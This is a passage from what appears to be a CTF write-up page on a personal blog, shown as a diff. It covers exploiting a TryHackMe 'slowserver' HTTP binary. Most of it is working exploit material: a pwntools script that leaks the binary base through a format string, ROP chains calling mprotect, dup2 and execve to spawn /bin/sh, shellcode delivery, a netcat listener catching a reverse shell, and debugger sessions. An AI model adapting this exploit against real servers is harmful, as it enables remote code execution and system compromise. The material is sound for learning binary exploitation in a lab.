+payload += p64(binary_base + 0x1808) # mov rbp, rsp; pop rax; ret;
+payload += p64(0xa)                  # syscall = mprotect()
+payload += p64(binary_base + 0x1816) # pop rdi; xor rdi, rbp; ret;
+payload += p64(stack_leak & 0xfff)   # clear last bytes
+payload += p64(binary_base + 0x1811) # pop rsi; ret;
+payload += p64(0x1000)               # len = 0x1000
+payload += p64(binary_base + 0x180d) # pop rdx; pop r12; ret;
+payload += p64(0x7)                  # prot = rwx
+payload += p64(0x0)                  # padding for pop
+payload += p64(binary_base + 0x1813) # syscall; ret;
+payload += p64(stack_leak + 0x50)    # shellcode address
+payload += shellcode
+
+request  = b""
+request += b"POST \r\n"
+request += payload
+
+shell.sendline(request)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 exploit.py
+[+] Opening connection to 10.10.212.25 on port 5555: Done  
+[*] Closed connection to 10.10.212.25 port 5555
+[+] Opening connection to 10.10.212.25 on port 5555: Done  
+[*] Closed connection to 10.10.212.25 port 5555</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.212.25 32982
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+ctf@63486e42aff8:/home/ctf$ id
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+ctf@63486e42aff8:/home/ctf$ cat flag.txt
+THM{ab4d-w3b-s3rv3r-g00d-rop-my-fr1end}
+ctf@63486e42aff8:/home/ctf$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">offset = 16
+junk = b"A" * offset
+
+payload  = b""
+payload += junk
+payload += b"/bin/sh\x00"            # command to execute
+payload += p64(binary_base + 0x1807) # push rbp; mov rbp, rsp; pop rax; ret;
+payload += p64(binary_base + 0x1816) # pop rdi; xor rdi, rbp; ret;
+payload += p64(0x0)                  # xor value
+payload += p64(binary_base + 0x180b) # pop rax; ret;
+payload += p64(0x3b)                 # syscall = execve()
+payload += p64(binary_base + 0x1811) # pop rsi; ret;
+payload += p64(0)                    # argv = NULL
+payload += p64(binary_base + 0x180d) # pop rdx; pop r12; ret;
+payload += p64(0x0)                  # envp = NULL
+payload += p64(0x0)                  # padding for pop
+payload += p64(binary_base + 0x1813) # syscall; ret;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> b *handle_post_request+239
+Breakpoint 1 at 0x163d
+pwndbg> run
+Starting program: /home/user/slowserver
+Server running on http://localhost:5555
+
+Breakpoint 1, 0x000055555555563d in handle_post_request ()
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> x/i $rip
+=> 0x555555555813 &lt__security_Check+16>:        syscall
+pwndbg> x/s $rdi
+0x7fffffffda78: "/bin/sh"
+pwndbg> p/x $rsi
+$1 = 0x0
+pwndbg> p/x $rdx
+$2 = 0x0
+pwndbg> p/x $rax
+$3 = 0x3b</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> ni
+process 1234 is executing new program: /usr/bin/dash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> b *main+241
+Breakpoint 1 at 0x190f
+pwndbg> r
+Starting program: /home/user/slowserver
+Server running on http://localhost:5555
+
+Breakpoint 1, 0x000055555555590f in main ()
+pwndbg> ni
+0x0000555555555914 in main ()
+pwndbg> p/x $rax
+$1 = 0x4
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">#!/usr/bin/python3
+from pwn import remote, p64
+
+shell = remote("10.10.212.25", 5555)
+
+shell.sendline(b"DEBUG %3$p")
+binary_base = int(shell.recvline().strip(), 16) - 0x2080
+
+shell.close()
+shell = remote("10.10.212.25", 5555)
+
+offset = 16
+junk = b"A" * offset
+
+payload  = b""
+payload += junk
+payload += b"/bin/sh\x00"            # command to execute
+
+for i in range(0, 3):
+    payload += p64(binary_base + 0x1816) # pop rdi; xor rdi, rbp; ret;
+    payload += b"+bin/sh\x00"            # xor value
+    payload += p64(binary_base + 0x1811) # pop rsi; ret;
+    payload += p64(i)                    # descriptor
+    payload += p64(binary_base + 0x180b) # pop rax; ret;
+    payload += p64(0x21)                 # syscall = dup2()
+    payload += p64(binary_base + 0x1813) # syscall; ret;
+
+payload += p64(binary_base + 0x1807) # push rbp; mov rbp, rsp; pop rax; ret;
+payload += p64(binary_base + 0x1816) # pop rdi; xor rdi, rbp; ret;
+payload += p64(0x0)                  # value for xor
+payload += p64(binary_base + 0x180b) # pop rax; ret;
+payload += p64(0x3b)                 # syscall = execve()
+payload += p64(binary_base + 0x1811) # pop rsi; ret;
+payload += p64(0)                    # argv = NULL
+payload += p64(binary_base + 0x180d) # pop rdx; pop r12; ret;
+payload += p64(0x0)                  # envp = NULL
+payload += p64(0x0)                  # padding for pop
+payload += p64(binary_base + 0x1813) # syscall; ret;
+
+request  = b""
+request += b"POST \r\n"
+request += payload
+
+shell.sendline(request)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 execve.py
+[+] Opening connection to 127.0.0.1 on port 5555: Done
+[*] Closed connection to 127.0.0.1 port 5555
+[+] Opening connection to 127.0.0.1 on port 5555: Done
+[*] Switching to interactive mode
+$ id
+uid=1000 gid=1000 groups=1000
+$ cat flag.txt
+THM{ab4d-w3b-s3rv3r-g00d-rop-my-fr1end}
+$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
